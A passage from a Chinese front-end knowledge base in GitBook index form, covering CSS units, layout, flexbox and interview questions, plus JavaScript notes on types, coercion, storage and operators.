两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值 两个外边距一正一负时，折叠结果是两者的相加的和 新手在做导航栏的时候发现页面整体掉下来一截就是这个原因。 CSS 单位 px 绝对单位。传统上一个像素对应于计算机屏幕上的一个点，而对于高清屏则对应更多。 % 父元素宽度的比例。 如果对 html 元素设置 font-size 为百分比值，则是以浏览器默认的字体大小 16px 为参照计算的（所有浏览器的默认字体大小都为 16px），如 62.5%即等于 10px（62.5% * 16px = 10px）。 em 相对单位。 不同的属性有不同的参照值。 对于字体大小属性（font-size）来说，em 的计算方式是相对于父元素的字体大小 border, width, height, padding, margin, line-height）在这些属性中，使用 em 单位的计算方式是参照该元素的 font-size，1em 等于该元素设置的字体大小。同理如果该元素没有设置，则一直向父级元素查找，直到找到，如果都没有设置大小，则使用浏览器默认的字体大小。 rem 是相对于根元素 html 的 font-size 来计算的，所以其参照物是固定的。 好处：rem 只需要修改 html 的 font-size 值即可达到全部的修改，即所谓的牵一发而动全身。 vw, vh, vmin, vmax 相对单位，是基于视窗大小（浏览器用来显示内容的区域大小）来计算的。 vw：基于视窗的宽度计算，1vw 等于视窗宽度的百分之一 vh：基于视窗的高度计算，1vh 等于视窗高度的百分之一 vmin：基于 vw 和 vh 中的最小值来计算，1vmin 等于最小值的百分之一 vmax：基于 vw 和 vh 中的最大值来计算，1vmax 等于最大值的百分之一 transform 变形 与 transition、translate 名字有点像，transition 是做过渡动画的，而 translate 是用来做平移的。 none 定义不进行转换。 matrix(n,n,n,n,n,n) 定义 2D 转换，使用六个值的矩阵。 translate(x,y) 从其当前位置移动，根据给定的 left（x 坐标）和 top（y 坐标） translate3d(x,y,z) 定义 3D 转换。 translateX(x) translateY(y) translateZ(z) scale(x[,y]?) 定义 2D 缩放转换。 scale3d(x,y,z) 定义 3D 缩放转换。 scaleX(x) scaleY(y) scaleZ(z) rotate(angle) 定义 2D 旋转，在参数中规定角度。 rotate3d(x,y,z,angle) 定义 3D 旋转。 rotateX(angle) rotateY(angle) rotateZ(angle) skew(x-angle,y-angle) 定义沿着 X 和 Y 轴的 2D 倾斜转换。 skewX(angle) skewY(angle) perspective(n) 为 3D 转换元素定义透视视图。 CSS 预处理器 嵌套 反映层级和约束 变量和计算 减少冗余代码 entend 和 mixin 代码片段重用 mixin 是直接把 CSS 代码每个地方重复写一份 extend 是使用逗号分割的选择器来为多个不同的地方使用同一段 CSS 循环 适用于复杂有规律的样式 import CSS 模块化 CSS 优化、提高性能的方法有哪些？ 多个 css 合并，尽量减少 HTTP 请求 css 雪碧图 抽象提取公共样式，减少代码量 选择器优化嵌套，尽量避免层级过深 （用‘>’替换‘ ’） 属性值为 0 时，不加单位 压缩 CSS 代码 避免使用 CSS 表达式 它们要计算成千上万次并且可能会对你页面的性能产生影响。 DOM 层级顺序与 z-index link 与 @import 的区别 link 是 HTML 方式， @import 是 CSS 方式 link 最大限度支持并行下载，@import 过多嵌套导致串行下载，出现 FOUC link 可以通过 rel=\"alternate stylesheet\" 指定候选样式 浏览器对 link 支持早于@import ，可以使用 @import 对老浏览器隐藏样式 @import 必须在样式规则之前，可以在 css 文件中引用其他文件 总体来说：link 优于@import CSS 有哪些继承属性 关于文字排版的属性如： font word-break letter-spacing text-align text-rendering word-spacing white-space text-indent text-transform text-shadow line-height color visibility cursor display 有哪些值？说明他们的作用 block 像块类型元素一样显示。 none 将元素的显示设为无，即在网页中不占任何的位置。 inline 内联元素，元素前后没有换行符。 inline-block 象行内元素一样定位，但其内容象块类型元素一样显示。 list-item 象块类型元素一样显示，并添加样式列表标记。 table 此元素会作为块级表格来显示 inherit 规定应该从父元素继承 display 属性的值 position 有哪些值？ relative 和 absolute 定位原点是？ absolute 生成绝对定位的元素，相对于值不为 static 的第一个父元素进行定位。 fixed （老 IE 不支持） 生成绝对定位的元素，相对于浏览器窗口进行定位。 relative 生成相对定位的元素，相对于其正常位置进行定位。 static 默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right - z-index 声明）。 inherit 规定从父元素继承 position 属性的值 CSS3 新特性？ 新增选择器 p:nth-child(n){color: rgba(255, 0, 0, 0.75)} 弹性盒模型 display: flex; 多列布局 column-count: 5; 媒体查询 @media (max-width: 480px) {.box: {column-count: 1;}} 个性化字体 @font-face{font-family: BorderWeb; src:url(BORDERW0.eot);} 颜色透明度 color: rgba(255, 0, 0, 0.75); 圆角 border-radius: 5px; 渐变 background:linear-gradient(red, green, blue); 阴影 box-shadow:3px 3px 3px rgba(0, 64, 128, 0.3); 倒影 box-reflect: below 2px; 文字装饰 text-stroke-color: red; 文字溢出 text-overflow:ellipsis; 背景效果 background-size: 100px 100px; 边框效果 border-image:url(bt_blue.png) 0 10; 平滑过渡 transition: all .3s ease-in .1s; 动画 @keyframes anim-1 {50% {border-radius: 50%;}} animation: anim-1 1s; 变形 transform 旋转 transform: rotate(20deg); 倾斜 transform: skew(150deg, -10deg); 位移 transform: translate(20px, 20px); 缩放 transform: scale(.5); 如何水平居中一个元素？ 如果需要居中的元素为 inline 或 inline-block，为父元素设置 text-align: center;即可实现 如果要居中的元素为一个块级元素的话，一般使用 margin: 0 auto; 进行居中。 用纯 CSS 创建一个三角形的原理是什么？ 把 border 的其他三条边设为透明 注意，这里要把 border-width 、border-style、 border-color 分开写。 .tri { width: 0px; height: 0; border-style: solid; border-width: 100px; border-color: transparent transparent red transparent; } li 与 li 之间有看不见的空白间隔是什么原因引起的？有什么解决办法？(也称幽灵字符) 行框的排列会受到中间空白（回车\\空格）等的影响，因为空格也属于字符, 这些空白也会被应用样式，占据空间，所以会有间隔，把字符大小设为 0，就没有空格了 display:inline-block 什么时候会显示间隙？(携程) 相邻的 inline-block 元素之间有换行或空格分隔的情况下会产生间距 非 inline-block 水平元素设置为 inline-block 也会有水平间距 可以借助 vertical-align:top; 消除垂直间隙 可以在父级加 font-size：0; 在子元素里设置需要的字体大小，消除垂直间隙 把 li 标签写到同一行可以消除垂直间隙，但代码可读性差 什么是响应式设计？响应式设计的基本原理是什么？如何兼容低版本的 IE？ 响应式设计就是网站能够兼容多个不同大小的终端，而不是为每个终端做一个特定的版本 基本原理是利用 CSS3 媒体查询，为不同尺寸的设备适配不同样式 对于低版本的 IE，可采用 JS 获取屏幕宽度，然后通过监听 window.onresize 方法来实现兼容 谈谈浮动和清除浮动 浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。 浮动框脱离文档流，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上。 清除方法： 父级 div 定义伪类：after 和 zoom (推荐使用，建议定义公共类，以减少 CSS 代码) .clearfloat:after { display: block; clear: both; content: \"\"; visibility: hidden; height: 0; } .clearfloat { zoom: 1; } 在结尾处添加空 div 标签 clear:both Left Right .left { float: left; } .clearfloat { clear: both; } 父级 div 定义 overflow:auto。 同时需要父级指定宽度 参考链接几种常用的清除浮动方法 box-sizing 常用的属性有哪些？分别有什么作用？ box-sizing: content-box; // 默认的标准(W3C)盒模型元素效果 box-sizing: border-box; // 触发怪异(IE)盒模型元素的效果 box-sizing: inherit; // 继承父元素 box-sizing 属性的值 请列举几种隐藏元素的方法 visibility: hidden; 这个属性只是简单的隐藏某个元素，但是元素占用的空间任然存在 opacity: 0; CSS3 属性，设置 0 可以使一个元素完全透明 position: absolute; 设置一个很大的 left 负值定位，使元素定位在可见区域之外 display: none; 元素会变得不可见，并且不会再占用文档的空间。 transform: scale(0); 将一个元素设置为缩放无限小，元素将不可见，元素原来所在的位置将被保留 HTML5 属性,效果和 display:none;相同，但这个属性用于记录一个元素的状态 height: 0; 将元素高度设为 0 ，并消除边框 filter: blur(0); CSS3 属性，将一个元素的模糊度设置为 0 rgba() 和 opacity 的透明效果有什么不同？ opacity 作用于元素以及元素内的所有内容（包括文字）的透明度 rgba() 只作用于元素自身的颜色或其背景色，子元素不会继承透明效果 css 属性 content 有什么作用？ content 属性专门应用在 before/after 伪元素上，用于插入额外内容或样式 元素竖向的百分比设定是相对于容器的高度吗？ 元素竖向的百分比设定是相对于容器的宽度，而不是高度 a 标签上四个伪类的使用顺序是怎么样的？ link > visited > hover > active 简称 lvha(love-ha) 伪类的特殊性（应用优先级）是同样的，所以后出现的伪类会覆盖先出现的伪类（同时激活） 在这里，比如把 hover 放在 active 后面，那么实际你在激活（active）链接的时候就触发了 hover 伪类，hover 在后面覆盖了 active 的颜色，所以始终无法看到 active 的颜色 伪元素和伪类的区别和作用？ 伪元素:在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。例如： p::before { content: \"第一章：\"; } p::after { content: \"Hot!\"; } p::first-line { background: red; } p::first-letter { font-size: 30px; } 伪类: 将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。例如： a:hover { color: #ff00ff; } p:first-child { color: red; } ::before 和 :after 中双冒号和单冒号有什么区别？ 在 CSS 中伪类一直用 : 表示，如 :hover, :active 等 伪元素在 CSS1 中已存在，当时语法是用 : 表示，如 :before 和 :after 后来在 CSS3 中修订，伪元素用 :: 表示，如 ::before 和 ::after，以此区分伪元素和伪类 由于低版本 IE 对双冒号不兼容，开发者为了兼容性各浏览器，继续使使用 :after 这种老语法表示伪元素 综上所述：::before 是 CSS3 中写伪元素的新语法； :after 是 CSS1 中存在的、兼容 IE 的老语法 设置元素浮动后，该元素的 display 值会如何变化？ 设置元素浮动后，该元素的 display 值自动变成 block 请解释 CSS sprites，以及你要如何在页面或网站中实现它 CSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用 CSS 的“background-image”，“background- repeat”，“background-position”的组合进行背景定位，background-position 可以用数字能精确的定位出背景图片的位置。 CSS Sprites 为一些大型的网站节约了带宽，让提高了用户的加载速度和用户体验，不需要加载更多的图片。 base64 的使用 写入 CSS， 减少 HTTP 请求 适用于小图片 base64 的体积约为原图 4/3 margin 叠加几种情况 margin 叠加的意思是：当两个或者更多的垂直外边距 相遇时，它们将形成一个外边距，这个外边距的高度等于两个发生叠加的外边距中高度较大者。 当一个元素出现在另一个元素上面时，第一个元素的底边外边距与第二个元素的顶边外边距发生叠加。如图： 当一个元素在另一个元素中时，它们的顶边距和低边距也会发生叠加 如果一个元素是空元素（即一个元素没有内容，内边距和边框），这种情况外边距的顶边距和低边距碰在一起也会发生叠加 在上面那种空元素的情况，如果该空元素与另一个元素的外边距碰在一起，也会发生叠加。 以上 4 种外边距叠加情况只会发生在普通文档流的垂直方向。行内框、浮动框、绝对定位框之间的外边距不会发生叠加，同样水平方向也不会发生叠加。 参考链接 https://github.com/huyaocode/webKnowledge/blob/master/0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/CSS/README.md Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 13:50:23 "},"知识库/04.编程开发/03.Web前端/00.前端基础/02.CSS/01.flex布局.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/02.CSS/01.flex布局.html","title":"01.flex布局","keywords":"","body":" [!TIP] 本篇全选至阮一峰老师的Flex 布局教程：语法篇 网页布局（layout）是 CSS 的一个重点应用。 布局的传统解决方案，基于盒状模型，依赖 display 属性 + position属性 + float属性。它对于那些特殊布局非常不方便，比如，垂直居中就不容易实现。 2009年，W3C 提出了一种新的方案----Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。 Flex 布局将成为未来布局的首选方案。本文介绍它的语法，给出常见布局的 Flex 写法。网友 JailBreak 为本文的所有示例制作了 Demo，也可以参考。 一、Flex 布局是什么？ Flex 是 Flexible Box 的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。 .box{ display: flex; } 行内元素也可以使用 Flex 布局。 .box{ display: inline-flex; } Webkit 内核的浏览器，必须加上-webkit前缀 .box{ display: -webkit-flex; /* Safari */ display: flex; } 注意，设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。 二、基本概念 采用 Flex 布局的元素，称为 Flex 容器（flex container），简称\"容器\"。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称\"项目\"。 容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做main start，结束位置叫做main end；交叉轴的开始位置叫做cross start，结束位置叫做cross end。 项目默认沿主轴排列。单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size。 三、容器的属性 以下6个属性设置在容器上。 flex-direction flex-wrap flex-flow justify-content align-items align-content 3.1 flex-direction属性 flex-direction属性决定主轴的方向（即项目的排列方向） .box { flex-direction: row | row-reverse | column | column-reverse; } 它有4个值。 row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿 3.2 flex-wrap属性 默认情况下，项目都排在一条线（又称\"轴线\"）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。 .box{ flex-wrap: nowrap | wrap | wrap-reverse; } 它可以取三个值 （1）nowrap（默认）：不换行。 （2）wrap：换行，第一行在上方。 （3）wrap-reverse：换行，第一行在下方。 3.3 flex-flow flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。 .box { flex-flow: || ; } 3.4 justify-content属性 justify-content属性定义了项目在主轴上的对齐方式。 .box { justify-content: flex-start | flex-end | center | space-between | space-around; } 它可以取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。 flex-start（默认值）：左对齐 flex-end：右对齐 center： 居中 space-between：两端对齐，项目之间的间隔都相等。 space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 3.5 align-items属性 它可以取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 flex-start：交叉轴的起点对齐。 flex-end：交叉轴的终点对齐。 center：交叉轴的中点对齐。 baseline: 项目的第一行文字的基线对齐。 stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。 3.6 align-content属性 align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 .box { align-content: flex-start | flex-end | center | space-between | space-around | stretch; } 该属性可以取6个值。 flex-start：与交叉轴的起点对齐。 flex-end：与交叉轴的终点对齐。 center：与交叉轴的中点对齐。 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。 space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。 stretch（默认值）：轴线占满整个交叉轴。 四、项目的属性 以下6个属性设置在项目上。 order flex-grow flex-shrink flex-basis flex align-self 4.1 order属性 order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。 .item { order: ; } 4.2 flex-grow属性 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 .item { flex-grow: ; /* default 0 */ } 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 4.3 flex-shrink属性 flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 .item { flex-shrink: ; /* default 1 */ } 如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。 [!TIP] 负值对该属性无效。 4.4 flex-basis属性 flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 .item { flex-basis: | auto; /* default auto */ } 它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。 4.5 flex属性 flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 .item { flex: none | [ ? || ] } 该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。 建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。 4.6 align-self属性 align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。 .item { align-self: auto | flex-start | flex-end | center | baseline | stretch; } 该属性可能取6个值，除了auto，其他都与align-items属性完全一致。 参考链接 http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:04:14 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/","title":"03.JavaScript","keywords":"","body":"JavaSript 基础 常见问题 eval 是做什么的？ eval 的功能是把对应的字符串解析成 JS 代码并运行 eval 不安全，若有用户输入会有被攻击风险 非常耗性能（先解析成 js 语句，再执行） 严格模式的限制 变量必须声明后再使用 函数的参数不能有同名属性，否则报错 不能使用 with 语句 不能对只读属性赋值，否则报错 不能使用前缀 0 表示八进制数，否则报错 不能删除不可删除的属性，否则报错 不能删除变量 delete prop，会报错，只能删除属性 delete global[prop] eval 不会在它的外层作用域引入变量 eval 和 arguments 不能被重新赋值 arguments 不会自动反映函数参数的变化 不能使用 arguments.callee 不能使用 arguments.caller 禁止 this 指向全局对象 不能使用 fn.caller 和 fn.arguments 获取函数调用的堆栈 增加了保留字（比如 protected、static 和 interface） Javascript 垃圾回收方法 标记清除（mark and sweep） 这是 JavaScript 最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境” 垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了 引用计数(reference counting) 在低版本 IE 中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加 1，如果该变量的值变成了另外一个，则这个值得引用次数减 1，当这个值的引用次数变为 0 的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为 0 的值占用的空间 参考链接 内存管理-MDN 哪些操作会造成内存泄漏？ JavaScript 内存泄露指对象在不需要使用它时仍然存在，导致占用的内存不能使用或回收 未使用 var 声明的全局变量 闭包函数(Closures) 循环引用(两个对象相互引用) 控制台日志(console.log) 移除存在绑定事件的 DOM 元素(IE) 为什么要使用模块化？都有哪几种方式可以实现模块化，各有什么特点？ 模块化可以给我们带来以下好处 解决命名冲突 提供复用性 提高代码可维护性 实现模块化方式： 立即执行函数 AMD 和 CMD CommonJS ES Module setTimeout、setInterval 常见的定时器函数有 setTimeout、setInterval、requestAnimationFrame，但 setTimeout、setInterval 并不是到了哪个时间就执行，而是到了那个时间把任务加入到异步事件队列中。 因为 JS 是单线程执行的，如果某些同步代码影响了性能，就会导致 setTimeout 不会按期执行。 而 setInterval 可能经过了很多同步代码的阻塞，导致不正确了，可以使用 setTimeout 每次获取 Date 值，计算距离下一次期望执行的时间还有多久来动态的调整。 requestAnimationFrame 自带函数节流功能，基本可以保证在 16.6 毫秒内只执行一次（不掉帧的情况下），并且该函数的延时效果是精确的，没有其他定时器时间不准的问题 cookie，localStorage，sessionStorage，indexDB 特性 cookie localStorage sessionStorage indexDB 数据生命周期 一般由服务器生成，可以设置过期时间 除非被清理，否则一直存在 页面关闭就清理 除非被清理，否则一直存在 数据存储大小 4K 5M 5M 无限 与服务端通信 每次都会携带在 header 中，对于请求性能影响 不参与 不参与 不参与 从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。 对于 cookie，我们还需要注意安全性。 属性 作用 value 如果用于保存用户登录态，应该将该值加密，不能使用明文的用户标识 http-only 不能通过 JS 访问 Cookie，减少 XSS 攻击 secure 只能在协议为 HTTPS 的请求中携带 same-site 规定浏览器不能在跨域请求中携带 Cookie，减少 CSRF 攻击 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:25:23 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/01.变量类型.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/01.变量类型.html","title":"01.变量类型","keywords":"","body":"JS 变量类型 JS 中有 6 种原始值，分别是： boolean number string undefined symbol null 引用类型： 对象 数组 函数 JS 中使用 typeof 能得到哪些类型？ 其中一个奇怪的 null，虽然是基本变量，但是因为设计的时候null是全 0，而对象是000开头，所以有这个误判。 boolean number string undefined symbol object function bigint instanceof 能正确判断对象的原理是什么？ 判断一个对象与构造函数是否在一个原型链上 const Person = function () {}; const p1 = new Person(); p1 instanceof Person; // true var str = \"hello world\"; str instanceof String; // false var str1 = new String(\"hello world\"); str1 instanceof String; // true 实现一个类型判断函数 判断 null 判断基础类型 使用Object.prototype.toString.call(target)来判断引用类型 注意： 一定是使用call来调用，不然是判断的 Object.prototype 的类型 之所以要先判断是否为基本类型是因为：虽然Object.prototype.toString.call()能判断出某值是：number/string/boolean，但是其实在包装的时候是把他们先转成了对象然后再判断类型的。 但是 JS 中包装类型和原始类型还是有差别的，因为对一个包装类型来说，typeof 的值是 object /** * 类型判断 */ function getType(target) { //先处理最特殊的Null if (target === null) { return \"null\"; } //判断是不是基础类型 const typeOfT = typeof target; if (typeOfT !== \"object\") { return typeOfT; } //肯定是引用类型了 const template = { \"[object Object]\": \"object\", \"[object Array]\": \"array\", // 一些包装类型 \"[object String]\": \"object - string\", \"[object Number]\": \"object - number\", \"[object Boolean]\": \"object - boolean\", }; const typeStr = Object.prototype.toString.call(target); return template[typeStr]; } \"a common string\"为什么会有 length 属性 通过字面量的方式创建：var a = 'string';，这时它就是基本类型值；通过构造函数的方式创建：var a = new String('string');这时它是对象类型。 基本类型是没有属性和方法的，但仍然可以使用对象才有的属性方法。这时因为在对基本类型使用属性方法的时候，后台会隐式的创建这个基本类型的对象，之后再销毁这个对象 如何判断一个数据是不是 Array Array.isArray(obj) ECMAScript 5 种的函数，当使用 ie8 的时候就会出现问题。 obj instanceof Array 当用来检测在不同的 window 或 iframe 里构造的数组时会失败。这是因为每一个 iframe 都有它自己的执行环境，彼此之间并不共享原型链，所以此时的判断一个对象是否为数组就会失败。此时我们有一个更好的方式去判断一个对象是否为数组。 Object.prototype.toString.call(obj) == '[object Array]' 这个方法比较靠谱 obj.constructor === Array constructor 属性返回对创建此对象的函数的引用 undefined 可被赋值 在 ES3 中(Firefox4 之前),window.undefined 就是一个普通的属性，你完全可以把它的值改变成为任意的真值，但在 ES5 中((Firefox4 之后),window.undefined 成了一个不可写,不可配置的数据属性,它的值永远是 undefined。 var undefined = 1; alert(undefined); // chrome: undefined, ie8: 1 不管是标准浏览器，还是老的 IE 浏览器，在函数内部 undefined 可作为局部变量重新赋值 function fn() { var undefined = 100; alert(undefined); //chrome: 100, ie8: 100 } fn(); 有时候我们需要判断一个变量是不是 undefined，会这样用 if (str === undefined) { console.log(\"I am empty\"); } 但假如 str 这个变量没声明就会出现报错，用下面的方式会更好一些 if (typeof str === \"undefined\") { console.log(\"I am better\"); } 有时候我们会看到这种写法 if (str === void 0) { console.log(\"I am real undefind\"); } 那是因为 「void 0」的执行结果永远是「undefined」, 即使在某些老旧浏览器 或者在某个函数中 undefined 被重新赋值，我们仍然可以通过void 0得到真正的 undefined。 参考链接 https://github.com/huyaocode/webKnowledge/blob/master/0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/JS/1-%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B.md Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:12:13 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/02.类型转换.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/02.类型转换.html","title":"02.类型转换","keywords":"","body":"类型转化 转 Boolean 以下都为假值，其他所有值都转为 true，包括所有对象（空对象，空数组也转为真）。 false undfined null '' NaN 0 -0 对象转基本类型 对象在转换基本类型时，会调用valueOf， 需要转成字符类型时调用toString。 var a = { valueOf() { return 0; }, toString() { return \"1\"; }, }; 1 + a; // 1 \"1\".concat(a); //\"11\" 也可以重写 Symbol.toPrimitive ，该方法在转基本类型时调用优先级最高。 Symbol.toPrimitive 指将被调用的指定函数值的属性转换为相对应的原始值。 类型转换 运算中其中一方为字符串，那么就会把另一方也转换为字符串 如果一方不是字符串或者数字，那么会将它转换为数字或者字符串 1 + \"1\"; // '11' true + true; // 2 4 + [1, 2, 3]; // \"41,2,3\" 还需要注意这个表达式'a' + + 'b' \"a\" + +\"b\"; // -> \"aNaN\" 因为 + 'b' 等于 NaN，所以结果为 \"aNaN\"，你可能也会在一些代码中看到过 + '1' 的形式来快速获取 number 类型。 JS 类型转换规则总结 JS 隐射类型转换 {} 等于 true 还是 false var a = {}; a == true; // -> false a == false; // -> false if (a) { console.log(\"进来\"); // 会输出 } 因为 a.toString() -> '[object Object]' ，而一个 100 + 问题 \"100\" + 100; // \"100100\" 100 + \"100\"; // \"100100\" 100 + true; // 101 100 + false; // 100 100 + undefined; //NaN 100 + null; // 100 parseInt 的坑 parseInt(0.0000001); // 1 parseInt(\"0.0000001\"); // 0 parseInt(1000000000000000000000) // 1 parseInt(\"1000000000000000000000\") // 1e+21 0.0000001.toString(); // \"1e-7\" 1 与 Number(1)有什么区别 var a = Number(1); // 1 var b = new Number(1); // Number {[[PrimitiveValue]]: 1} typeof a; // number typeof b; // object a == b; // true var a = 1 是一个常量，而 Number(1)是一个函数 new Number(1)返回的是一个对象 a==b 为 true 是因为所以在求值过程中，总是会强制转为原始数据类型而非对象，例如下面的代码: typeof 123; // \"number\" typeof new Number(123); // \"object\" 123 instanceof Number( // false new Number(123) ) instanceof Number; // true 123 === new Number(123); // false console.log(!!(new Boolean(false))输出什么 [易混淆] true 布尔的包装对象 Boolean 的对象实例，对象只有在 null 与 undefined 时，才会认定为布尔的 false 值，布尔包装对象本身是个对象，对象->布尔 都是 true，所以 new Boolean(false)其实是布尔的 true，看下面这段代码: if (new Boolean(false)) { alert(\"true!!\"); } 只有使用了 valueOf 后才是真正的转换布尔值，与上面包装对象与原始资料转换说明的相同: !!new Boolean(false)( //true new Boolean(false) ).valueOf(); //false Object.prototype.toString 如果是原始类型，他会将原始类型包装为引用类型，然后调用对应方法 function dd() {} var toString = Object.prototype.toString; toString.call(dd); //[object Function] toString.call(new Object()); //[object Object] toString.call(new Array()); //[object Array] toString.call(new Date()); //[object Date] toString.call(new String()); //[object String] toString.call(Math); //[object Math] toString.call(undefined); //[object Undefined] toString.call(null); //[object Null] toString.call(123); //[object Number] toString.call(\"abc\"); //[object String] obj.toString() 和 Object.prototype.toString.call(obj) 同样是检测对象 obj 调用 toString 方法，obj.toString()的结果和 Object.prototype.toString.call(obj)的结果不一样，这是为什么？ 这是因为 toString 为 Object 的原型方法，而 Array ，function 等类型作为 Object 的实例，都重写了 toString 方法。不同的对象类型调用 toString 方法时，根据原型链的知识，调用的是对应的重写之后的 toString 方法（function 类型返回内容为函数体的字符串，Array 类型返回元素组成的字符串.....），而不会去调用 Object 上原型 toString 方法（返回对象的具体类型），所以采用 obj.toString()不能得到其对象类型，只能将 obj 转换为字符串类型；因此，在想要得到对象的具体类型时，应该调用 Object 上原型 toString 方法。 输出以下代码运行结果 1 + \"1\" 2 * \"2\" [1, 2] + [2, 1] \"a\" + + \"b\" 1 + \"1\" 加性操作符：如果只有一个操作数是字符串，则将另一个操作数转换为字符串，然后再将两个字符串拼接起来 所以值为：“11” 2 * \"2\" 乘性操作符：如果有一个操作数不是数值，则在后台调用 Number()将其转换为数值 [1, 2] + [2, 1] Javascript 中所有对象基本都是先调用 valueOf 方法，如果不是数值，再调用 toString 方法。 所以两个数组对象的 toString 方法相加，值为：\"1,22,1\" \"a\" + + \"b\" 后边的“+”将作为一元操作符，如果操作数是字符串，将调用 Number 方法将该操作数转为数值，如果操作数无法转为数值，则为 NaN。 所以值为：\"aNaN\" Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:42 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/03.运算符.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/03.运算符.html","title":"03.运算符","keywords":"","body":"|| 操作符 只要有一个条件为 true 时，结果就为 true； 当两个条件都为 false 时，结果才为 false； 当一个条件为 true 时，后面的条件不再判断 注意：当数值参与逻辑或运算时，结果为 true，会返回第一个为真的值；如果结果为 false，会返回第二个为假的值； == 操作符 对于 == 来说，如果对比双方的类型不一样的话，就会进行类型转换 判断流程： 首先会判断两者类型是否相同。相同的话就是比大小了 类型不相同的话，那么就会进行类型转换 会先判断是否在对比 null 和 undefined，是的话就会返回 true 判断两者类型是否为 string 和 number，是的话就会将字符串转换为 number 1 == '1' ↓ 1 == 1 判断其中一方是否为 boolean，是的话就会把 boolean 转为 number 再进行判断 '1' == true ↓ '1' == 1 ↓ 1 == 1 判断其中一方是否为 object 且另一方为 string、number 或者 symbol，是的话就会把 object 转为原始类型再进行判断 '1' == { a: 'b' } ↓ '1' == '[object Object]' 两边都是对象的话，那么只要不是同一对象的不同引用，都为 false 注意，只要出现 NaN，就一定是 false，因为就连 NaN 自己都不等于 NaN 对于 NaN，判断的方法是使用全局函数 isNaN() === 操作符 不转类型，直接判断类型和值是否相同。 但是 NaN === NaN 还是 false && 操作符 